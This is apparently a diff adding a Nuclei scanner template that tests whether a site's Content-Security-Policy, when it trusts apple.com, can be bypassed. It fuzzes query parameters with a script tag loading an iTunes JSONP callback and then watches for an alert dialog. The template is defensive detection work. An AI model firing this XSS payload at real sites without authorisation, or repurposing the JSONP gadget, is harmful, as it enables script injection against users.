@@ -1,0 +1,55 @@
+id: itunes-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - iTunes
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,itunes
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "apple.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: itunes_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "itunes_csp_xss == true"
+# digest: 4a0a0047304502200206b918e36f9360392f64cfb46ff0f5a520f8cd6c2eac6718d6a92009000a62022100b496bf4af8a0a2f72bd9a1665c2f9627b8c74236024486ba8349c2e9bdb5b95e:922c64590222798bb761d5b6d8e72950
